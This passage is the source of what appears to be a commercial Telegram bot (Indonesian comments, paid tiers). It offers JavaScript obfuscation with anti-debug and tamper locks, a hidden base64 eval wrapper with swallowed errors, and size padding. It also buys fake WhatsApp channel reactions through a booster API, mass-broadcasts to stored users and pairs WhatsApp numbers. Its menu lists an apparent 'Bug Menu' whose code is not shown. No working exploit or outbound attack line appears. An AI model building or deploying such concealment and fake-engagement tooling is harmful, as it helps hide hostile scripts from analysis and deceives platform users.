        for (let i = 0; i < randomSuffixLength; i++) {
            suffix += chars[Math.floor(Math.random() * chars.length)];
        }
        // Gunakan nama kustom sebagai prefiks, tambahkan sufiks acak
        return `${customName}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateCustomName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Stabil dan kuat
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Mandarin style (diperkuat dan aman)
const getMandarinObfuscationConfig = () => {
    const mandarinChars = [
        "龙", "虎", "风", "云", "山", "河", "天", "地", "雷", "电",
        "火", "水", "木", "金", "土", "星", "月", "日", "光", "影",
        "峰", "泉", "林", "海", "雪", "霜", "雾", "冰", "焰", "石"
    ];

    const generateMandarinName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += mandarinChars[Math.floor(Math.random() * mandarinChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateMandarinName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Arab style (diperkuat dan aman)
const getArabObfuscationConfig = () => {
    const arabicChars = [
        "أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي"
    ];

    const generateArabicName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateArabicName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

const getJapanxArabObfuscationConfig = () => {
    const japaneseXArabChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん" 
    ];

    const generateJapaneseXArabName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseXArabName(),
        stringCompression: true, // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string        
        controlFlowFlattening: 0.95, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        shuffle: true,
        rgf: false,
        dispatcher: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};
const getUltraObfuscationConfig = () => {
    const generateUltraName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz";
        const numbers = "0123456789";
        const randomNum = numbers[Math.floor(Math.random() * numbers.length)];
        const randomChar = chars[Math.floor(Math.random() * chars.length)];
        return `z${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateUltraName(),
        stringCompression: true, // Kompresi string untuk keamanan tinggi
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9,
        flatten: true,
        shuffle: true,
        rgf: true, // Randomized Global Functions
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Japan style (diperkuat dan aman)
const getJapanObfuscationConfig = () => {
    const japaneseChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ",
        "ら", "り", "る", "れ", "ろ", "わ", "を", "ん"
    ];

    const generateJapaneseName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk /nou (diperkuat dan aman)
const getNewObfuscationConfig = () => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    shuffle: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
});

const handleObfusCommand = async (msg, configGetter, styleName, options = {}) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!CONFIG.owner.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Obfuscation commands are owner-only.");
    }

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ Reply to a .js file!");
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, "❌ Only .js files supported!");
    }

    const progressMsg = await bot.sendMessage(chatId, "```css\n🔒 Starting... (0%)\n▱▱▱▱▱▱▱▱▱▱\n```", { parse_mode: 'Markdown' });

    const updateProgress = async (percent, status) => {
        const bar = createProgressBar(percent);
        await bot.editMessageText(`\`\`\`css\n🔒 ${styleName}\n${percent === 100 ? "✅ Done" : "⚙️ " + status} (${percent}%)\n${bar}\n\`\`\``, {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown'
        });
    };

    try {
        await updateProgress(10, "Downloading");
        const fileInfo = await bot.getFile(file.file_id);
        const fileLink = `https://api.telegram.org/file/bot${CONFIG.botToken}/${fileInfo.file_path}`;
        const response = await fetch(fileLink);
        let content = await response.text();

        await updateProgress(30, "Validating");
        new Function(content); // Basic syntax check

        await updateProgress(50, "Obfuscating");

        let finalCode;

        // Special obfuscators (no JsConfuser)
        if (options.special === 'quantum') {
            finalCode = await obfuscateQuantum(content);
        } else if (options.special === 'timelocked') {
            finalCode = await obfuscateTimeLocked(content, options.days);
        } else {
            // Standard JsConfuser path
            let conf;
            if (typeof configGetter === 'function') {
                conf = configGetter(options.param);
            } else {
                conf = configGetter; // Direct config object
            }

            if (!conf || typeof conf !== 'object') {
                throw new Error("Invalid or missing obfuscation configuration");
            }

            const result = await JsConfuser.obfuscate(content, conf);
            finalCode = result.code || result;
        }

        // Post-processing layers
        if (options.invisible) {
            const encoded = encodeInvisible(finalCode);
            finalCode = `(function(){function d(t){if(!t.startsWith('\\u200B'))return t;try{return Buffer.from(t.slice(1),'base64').toString('utf-8');}catch(e){return t;}}try{eval(d("${encoded}"));}catch(e){}})();`;
        }

        if (options.bigSize) {
            const currentBytes = Buffer.byteLength(finalCode, 'utf8');
            const targetBytes = options.bigSize * 1024 * 1024;
            if (currentBytes < targetBytes) {
                const paddingSize = targetBytes - currentBytes;
                const padding = crypto.randomBytes(paddingSize).toString('base64');
                finalCode += `\n/* Padding ${paddingSize} bytes */\n// ${padding}`;
            }
        }

        const header = `/*\nCant steal my code??Hahaha\nBuy Full Source Code From me\nTelegram: @dgxeon13\n*/\n\n`;
        finalCode = header + finalCode;

        const tempPath = path.join(__dirname, `temp-obfus-${Date.now()}-${file.file_name}`);
        await fse.writeFile(tempPath, finalCode);
        await updateProgress(90, "Sending");

        await bot.sendDocument(chatId, tempPath, {
            caption: `✅ ${styleName} obfuscation complete!`,
            filename: `obfuscated-${styleName.toLowerCase().replace(/\s+/g, '-')}-${file.file_name}`
        });

        await updateProgress(100, "Done");
        await fse.remove(tempPath);
    } catch (err) {
        console.error("Obfus error:", err);
        bot.sendMessage(chatId, `❌ Error: ${err.message || "Unknown error during obfuscation"}`);
        try {
            await updateProgress(100, "Failed");
        } catch {}
    }
};

function registerCommandHandlers(botInstance, isRootBot = false) {

// Standard
bot.onText(/^\/enc(?:\s+(low|medium|high))?/i, (msg, match) => {
    const level = (match[1] || 'high').toLowerCase();
    handleObfusCommand(msg, () => getObfuscationConfig(level), `Standard (${level})`);
});

bot.onText(/^\/eval(?:\s+(low|medium|high))?/i, (msg, match) => {
    const level = (match[1] || 'high').toLowerCase();
    handleObfusCommand(msg, () => getObfuscationConfig(level), `Eval + Obfus (${level})`);
});

// Styles
bot.onText(/^\/china$/i, msg => handleObfusCommand(msg, getMandarinObfuscationConfig(), "Mandarin Style"));
bot.onText(/^\/arab$/i, msg => handleObfusCommand(msg, getArabObfuscationConfig(), "Arabic Style"));
bot.onText(/^\/japan$/i, msg => handleObfusCommand(msg, getJapanObfuscationConfig(), "Japanese Style"));
bot.onText(/^\/japanxarab$/i, msg => handleObfusCommand(msg, getJapanxArabObfuscationConfig(), "Japan x Arab"));
bot.onText(/^\/stealth$/i, msg => handleObfusCommand(msg, getInvisObfuscationConfig(), "Invisible Mode"));
bot.onText(/^\/bes64$/i, msg => handleObfusCommand(msg, getXObfuscationConfig(), "X Invisible", { invisible: true }));
bot.onText(/^\/nou$/i, msg => handleObfusCommand(msg, getNewObfuscationConfig(), "Advanced Layer"));
bot.onText(/^\/fortress$/i, msg => handleObfusCommand(msg, getStrongObfuscationConfig(), "Power Fortress"));
bot.onText(/^\/uprotect$/i, msg => handleObfusCommand(msg, getUltraObfuscationConfig(), "Ultra Protection"));
bot.onText(/^\/nebula$/i, msg => handleObfusCommand(msg, getNebulaObfuscationConfig(), "Nebula Polymorphic"));
bot.onText(/^\/nova$/i, msg => handleObfusCommand(msg, getNovaObfuscationConfig(), "Nova Dynamic"));
bot.onText(/^\/siu$/i, msg => handleObfusCommand(msg, getSiuCalcrickObfuscationConfig(), "Siu Calcrick"));
bot.onText(/^\/quantum$/i, msg => handleObfusCommand(msg, null, "Quantum Vortex", { special: 'quantum' }));

// Time-locked
bot.onText(/^\/timez\s+(\d+)$/i, (msg, match) => {
    const days = parseInt(match[1]);
    if (days < 1 || days > 365) return bot.sendMessage(msg.chat.id, "Days must be 1-365");
    handleObfusCommand(msg, null, `Time-Locked (${days} days)`, { special: 'timelocked', days });
});

// Max intensity
bot.onText(/^\/max\s+(\d+)$/i, (msg, match) => {
    const intensity = Math.min(10, Math.max(1, parseInt(match[1])));
    handleObfusCommand(msg, (i) => getMaxObfuscationConfig(i), `Max Intensity ${intensity}`, { param: intensity });
});

// Big size (complete with padding)
bot.onText(/^\/big\s+(\d+)$/i, (msg, match) => {
    const mb = Math.max(1, parseInt(match[1]));
    handleObfusCommand(msg, getBigObfuscationConfig(), `Big Size (${mb}MB)`, { bigSize: mb });
});

// Custom name
bot.onText(/^\/custom\s+(.+)$/i, (msg, match) => {
    const name = match[1].replace(/[^a-zA-Z0-9_]/g, "");
    if (!name) return bot.sendMessage(msg.chat.id, "Invalid custom name");
    handleObfusCommand(msg, (n) => getCustomObfuscationConfig(n), `Custom (${name})`, { param: name });
});

bot.onText(/^\/deobfuscate$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!CONFIG.owner.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Deobfuscation is owner-only.");
    }

    if (!msg.reply_to_message || !msg.reply_to_message.document || !msg.reply_to_message.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, "❌ Reply to an obfuscated .js file!");
    }

    const file = msg.reply_to_message.document;
    const progressMsg = await bot.sendMessage(chatId, "```css\n🔓 Deobfuscating... (0%)\)\n▱▱▱▱▱▱▱▱▱▱\n```", { parse_mode: 'Markdown' });

    const updateProgress = async (p, s) => {
        const bar = createProgressBar(p);
        await bot.editMessageText(`\`\`\`css\n🔓 Deobfuscate\n${p === 100 ? "✅ Done" : "⚙️ " + s} (${p}%)\n${bar}\n\`\`\``, {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown'
        });
    };

    try {
        await updateProgress(20, "Downloading");
        const fileInfo = await bot.getFile(file.file_id);
        const fileLink = `https://api.telegram.org/file/bot${CONFIG.botToken}/${fileInfo.file_path}`;
        const response = await fetch(fileLink);
        const content = await response.text();

        await updateProgress(50, "Deobfuscating");
        const result = await webcrack(content);
        let deob = result.code || content;
        if (result.bundle) deob = "// Bundled code detected\n" + deob;

        const tempPath = path.join(__dirname, `deob-${Date.now()}-${file.file_name}`);
        await fse.writeFile(tempPath, deob);
        await updateProgress(90, "Sending");

        await bot.sendDocument(chatId, tempPath, {
            caption: "✅ Deobfuscation complete!",
            filename: `deobfuscated-${file.file_name}`
        });

        await updateProgress(100, "Done");
        await fse.remove(tempPath);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

bot.onText(/^\/obfus$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Owner-only check
    if (!CONFIG.owner.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ This command is restricted to bot owners only.");
    }

    const caption = `
╭━━━「 OBFUS MENU 」━━━⬣
│ 
│ Author : ${CONFIG.usertele}
│ Status : Owner-Only Feature
│
├━━━「 STANDARD 」━━━⬣
│ /enc <low|medium|high> - Standard Obfuscation
│ /eval <low|medium|high> - Eval + Obfuscate
├━━━「 STYLES 」━━━⬣
│ /china - Mandarin Style
│ /arab - Arabic Style
│ /japan - Japanese Style
│ /japanxarab - Japan x Arab Style
│ /stealth - Invisible Mode
│ /bes64 - X Invisible Base64
│ /nou - Advanced Layer
│ /fortress - Power Fortress
│ /uprotect - Ultra Protection
│ /nebula - Nebula Polymorphic
│ /nova - Nova Dynamic
│ /siu - Siu Calcrick Chaos
│ /quantum - Quantum Vortex
│ /timez <days> - Time-Locked (1-365)
├━━━「 CUSTOM 」━━━⬣
│ /max <1-10> - Max Intensity
│ /big <mb> - Big Size Padding
│ /custom <name> - Custom Identifier
├━━━「 DEOBFUSCATE 」━━━⬣
│ /deobfuscate - Deobfuscate File
╰━━━━━━━━━━━━━━━━⬣
    `;

    bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' });
});

botInstance.onText(/\/reactwa(?:\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  // Premium/VIP check
  const isVip = await checkVipMembership(senderId, userBot);
  if (!db.premiumUsers.includes(senderId) && 
      !CONFIG.owner.includes(senderId) && 
      !db.OwnerUsers.includes(senderId) && 
      !isVip) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.\n\n📩 Please contact the developer to buy: ${CONFIG.usertele}\n\n💰 Price/Harga:\n✅ Access permanent: 15$\n✅ Resell permanent: 35$\n✅ Script No Enc 100%: 100$`);
  }

  // === REACTWA SPECIFIC 15-MINUTE COOLDOWN (owners exempt) ===
  if (!CONFIG.owner.includes(senderId)) {
    const lastUsed = reactwaRateLimit.get(senderId) || 0;
    const timeLeft = REACTWA_COOLDOWN_MS - (Date.now() - lastUsed);
    if (timeLeft > 0) {
      const minutes = Math.floor(timeLeft / 60000);
      const seconds = Math.floor((timeLeft % 60000) / 1000);
      return userBot.sendMessage(chatId, `⏰ Cooldown active. Please wait ${minutes}m ${seconds}s before using /reactwa again.`);
    }
  }

  if (!match[1] || match[1].trim() === '') {
    return userBot.sendMessage(chatId, 
      '❌ Usage: /reactwa <link> <emojis>\n\n' +
      'Examples:\n' +
      '• /reactwa https://whatsapp.com/channel/... 🔥 ❤️ 👍\n' +
      '• /reactwa https://whatsapp.com/channel/... 🔥,❤️,👍\n' +
      '• /reactwa https://whatsapp.com/channel/... 🎄😆😵‍💫\n' +
      '• /reactwa https://whatsapp.com/channel/... 🥳 🎉  🚀'
    );
  }

  const args = match[1].trim().split(/\s+/);
  if (args.length < 2) {
    return userBot.sendMessage(chatId, '❌ Please provide both the WhatsApp channel link and at least one emoji');
  }

  let link = args[0];
  const emojiPart = args.slice(1).join(' ').trim();

  // Basic link validation
  if (!link.startsWith('https://whatsapp.com/channel/') && 
      !link.startsWith('https://chat.whatsapp.com/')) {
    return userBot.sendMessage(chatId, '❌ Invalid WhatsApp channel link format.\nMust start with https://whatsapp.com/channel/ or https://chat.whatsapp.com/');
  }

  // ── Improved Emoji parsing ───────────────────────────────────────────────
  let emojis = [];

  // Case 1: Contains commas → split by comma (classic style)
  if (emojiPart.includes(',')) {
    emojis = emojiPart.split(',')
      .map(e => e.trim())
      .filter(e => e.length > 0);
  } 
  // Case 2: No commas → try space separated first, then fallback to emoji boundary split
  else {
    const cleaned = emojiPart.replace(/\s+/g, ' ').trim(); // normalize multiple spaces

    // Most common: space-separated emojis
    if (cleaned.includes(' ')) {
      emojis = cleaned.split(' ')
        .map(e => e.trim())
        .filter(e => e.length > 0);
    } 
    // No spaces → probably stuck together → try unicode emoji splitting
    else {
      emojis = cleaned
        .split(/(?=\p{Emoji_Presentation}|\p{Extended_Pictographic})/gu)
        .filter(e => e && /\p{Emoji}/u.test(e));

      // Ultimate fallback: treat whole input as single emoji
      if (emojis.length === 0 && cleaned.length > 0) {
        emojis = [cleaned];
      }
    }
  }

  if (emojis.length === 0) {
    return userBot.sendMessage(chatId, '❌ Could not detect any valid emojis');
  }

  // Optional: remove duplicates and limit maximum emojis
  emojis = [...new Set(emojis)]; // remove duplicates
  if (emojis.length > 12) {
    emojis = emojis.slice(0, 12);
    await userBot.sendMessage(chatId, '⚠️ Too many emojis → limited to first 12');
  }

  // Send waiting message
  const waitingMsg = await userBot.sendMessage(chatId, '⏳ Sending reactions... please wait');

  try {
    const response = await fetch('https://easybooster.shop/api/v1/react', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${CONFIG.apikey_reactwa}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        channelLink: link,
        emojis: emojis
      })
    });

    const data = await response.json();

    if (response.ok && data.success === true) {
      await userBot.editMessageText(
        `✅ Success!\nSent ${emojis.length} reaction${emojis.length === 1 ? '' : 's'}`,
        {
          chat_id: chatId,
          message_id: waitingMsg.message_id
        }
      );

      // === SET COOLDOWN ONLY ON SUCCESS (owners already bypassed above) ===
      reactwaRateLimit.set(senderId, Date.now());

    } else {
      await userBot.editMessageText(
        `❌ Failed: ${data.message || 'Unknown error from API'}`,
        {
          chat_id: chatId,
          message_id: waitingMsg.message_id
        }
      );
    }
  } catch (error) {
    console.error('reactwa command error:', error);

    let errorText = '❌ An error occurred while sending reactions';
    if (error.message?.includes('timeout')) {
      errorText = '❌ Request timed out - API might be slow right now';
    }

    try {
      await userBot.editMessageText(errorText, {
        chat_id: chatId,
        message_id: waitingMsg.message_id
      });
    } catch (editError) {
      // Fallback if message was deleted or edit failed
      await userBot.sendMessage(chatId, errorText);
    }
  }
});
// ============== BAN COMMANDS ==============
  botInstance.onText(/\/addban(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    if (!CONFIG.owner.includes(senderId)) {
      return getUserBot(botInstance).sendMessage(chatId, 'Only the bot owner can ban users.');
    }

    if (!match[1]) {
      return getUserBot(botInstance).sendMessage(chatId, 'Usage: /addban <userID>');
    }

    const targetId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(targetId)) return getUserBot(botInstance).sendMessage(chatId, 'Invalid user ID.');

    if (db.bannedUsers.includes(targetId)) {
      return getUserBot(botInstance).sendMessage(chatId, `User ${targetId} is already banned.`);
    }

    db.bannedUsers.push(targetId);
    saveJson('./database/banned.json', db.bannedUsers);
    cleanBannedFromAll();

    await getUserBot(botInstance).sendMessage(chatId, `User ${targetId} has been permanently banned.`);
  });

  botInstance.onText(/\/delban(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    if (!CONFIG.owner.includes(senderId)) {
      return getUserBot(botInstance).sendMessage(chatId, 'Only the bot owner can unban users.');
    }

    if (!match[1]) {
      return getUserBot(botInstance).sendMessage(chatId, 'Usage: /delban <userID>');
    }

    const targetId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(targetId)) return getUserBot(botInstance).sendMessage(chatId, 'Invalid user ID.');

    if (!db.bannedUsers.includes(targetId)) {
      return getUserBot(botInstance).sendMessage(chatId, `User ${targetId} is not banned.`);
    }

    db.bannedUsers = db.bannedUsers.filter(id => id !== targetId);
    saveJson('./database/banned.json', db.bannedUsers);

    await getUserBot(botInstance).sendMessage(chatId, `User ${targetId} has been unbanned.`);
  });

botInstance.onText(/\/listban/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, 'Only owner can use this command.');
  if (db.bannedUsers.length === 0) return userBot.sendMessage(chatId, 'No banned users found.');

  const parts = [];
  let text = `<b>┌──────┤ Banned Users List ├──────┐</b>\n\nTotal: <b>${db.bannedUsers.length}</b>\n\n`;
  let count = 0;

  for (const userId of db.bannedUsers) {
    count++;
    const userLink = await formatUserLink(userBot, userId, true);

    const line = `${count}. ${userLink}\n   <b>ID:</b> <code>${userId}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Banned Users List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

// ==================== IMPROVED BROADCAST COMMAND (/bc) ====================
botInstance.onText(/\/bc$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Debug log so we always know the command was received
  console.log(`[BC] /bc received from ${senderId} (${msg.from.username || 'no-username'}) at ${new Date().toISOString()}`);

  if (!CONFIG.owner.includes(senderId)) {
    console.log(`[BC] Unauthorized: ${senderId}`);
    return;
  }

  // Very safe reply check - prevents the classic silent crash
  if (!msg.reply_to_message || !msg.reply_to_message.message_id) {
    console.log(`[BC] No valid reply_to_message`);
    return botInstance.sendMessage(chatId, 
      '❌ You must *reply* to a message to broadcast it.\n\n' +
      'Reply → then type /bc'
    );
  }

  const replyId = msg.reply_to_message.message_id;
  console.log(`[BC] Broadcasting reply message_id = ${replyId}`);

  const userBot = getUserBot(botInstance);
  if (!userBot) {
    console.error(`[BC] getUserBot returned null/undefined`);
    return botInstance.sendMessage(chatId, '❌ Internal error: Bot instance unavailable.');
  }

  // Safe user list extraction
  const targets = db.userNumbers && typeof db.userNumbers === 'object' 
    ? Object.keys(db.userNumbers) 
    : [];

  const targetUserIds = targets.filter(id => parseInt(id) !== senderId);

  if (targetUserIds.length === 0) {
    return userBot.sendMessage(chatId, 'No users to broadcast to.');
  }

  await userBot.sendMessage(chatId, 
    `<b>Broadcast started → ${targetUserIds.length} users…</b>`, 
    { parse_mode: 'HTML' }
  );

  let success = 0;
  let failed = 0;

  for (const uid of targetUserIds) {
    try {
      await userBot.copyMessage(uid, chatId, replyId, {
        disable_notification: true
      });
      success++;
    } catch (err) {
      failed++;
      console.log(`BC failed to ${uid}: ${err.message}`);
      // Optional: handle rate-limit
      if (err.response?.statusCode === 429) {
        const wait = (err.response.body?.parameters?.retry_after || 30) + 2;
        await sleep(wait * 1000);
      }
    }
    await sleep(1100); // gentle delay
  }

  await userBot.sendMessage(chatId, `
<b>Finished!</b>
Success: ${success}
Failed: ${failed}
Total: ${targetUserIds.length}
  `, { parse_mode: 'HTML' });
});

  botInstance.onText(/\/start|menu(?:\s(.+))?/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
let status = 'Free User';
const isOwner = CONFIG.owner.includes(senderId);
const isPremium = db.premiumUsers.includes(senderId);
const isVip = await checkVipMembership(senderId, userBot);  // New VIP check
if (isOwner) {
  status = 'Owner';
} else if (isPremium || isVip) {
  status = 'Vip User';
}

  const caption = `
┌────┤ ${CONFIG.botname} ├───┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
└───────────────────────┘
┌────┤ Press Button Menu ├───┐
└───────────────────────┘
`;

  await userBot.sendPhoto(chatId, CONFIG.pfp, {
    caption,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '〢Bug Menu', callback_data: 'bugmenu' },
          { text: '〢Misc Menu', callback_data: 'miscmenu' },
        ],
        [{ text: '〢Channel', url: CONFIG.CHANNEL_INVITE_LINK }],
               [{ text: '〢Group', url: CONFIG.GROUP_LINK }],
      ],
    },
  });
});

// Save every user who ever sends any message (even just /start)
botInstance.on('message', (msg) => {
  if (msg.chat.type !== 'private') return;

  const userId = msg.from.id.toString();

  // Create the entry if it doesn't exist yet
  if (!db.userNumbers[userId]) {
    db.userNumbers[userId] = null; // null = no WhatsApp number paired yet
    saveJson('./database/user_numbers.json', db.userNumbers);
  }
});

  botInstance.onText(/\/reqpair(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;
    // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

    if (!match?.[1]?.trim()) {
    return userBot.sendMessage(chatId, 'Provide a phone number.\nExample: /reqpair +6281234567890');
  }

    const rawNumber = match[1].trim();
    if (!isValidPhoneNumber(rawNumber)) {
      return userBot.sendMessage(chatId, '❌ Invalid phone number. Use international format (e.g., +919876543210).');
    }

    const numberTarget = rawNumber.replace(/[^0-9+]/g, '').replace(/^\+/, '');
    if (numberTarget.includes('@g.us')) {
      return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
    }

    try {
      await getSessions(userBot, chatId, numberTarget);
    } catch (error) {
      console.error(`Error in /reqpair for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, '❌ Failed to process /reqpair: Server error.');
    }
  });

  botInstance.onText(/\/delpair(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;
    // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
